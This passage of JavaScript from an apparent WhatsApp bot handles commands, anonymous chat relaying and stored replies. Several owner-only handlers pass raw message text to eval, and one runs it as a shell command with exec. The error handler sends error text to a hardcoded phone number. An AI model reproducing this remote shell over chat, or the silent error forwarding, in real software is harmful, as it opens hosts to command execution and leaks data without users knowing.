let hayu = kaydt[Math.floor(Math.random() * kaydt.length)];
Panda.sendMessage(m.chat,{video:{url:hayu},caption:`${mess.succes}`},{quoted: m})
}
break
case '>':
case '=>':
if (!itsMePanda) return;
var err = new TypeError;
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return reply(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
reply(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
reply(util.format(_syntax + _err))
}
break
default:
if (budy.startsWith('<')) {
if (!itsMePanda) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('vv')) {
if (!itsMePanda) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!itsMePanda) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Panda.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
sendKaylaMessage("56921700706@s.whatsapp.net", { text: "Hola te escribo para comumicarte que hay un error " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
}
}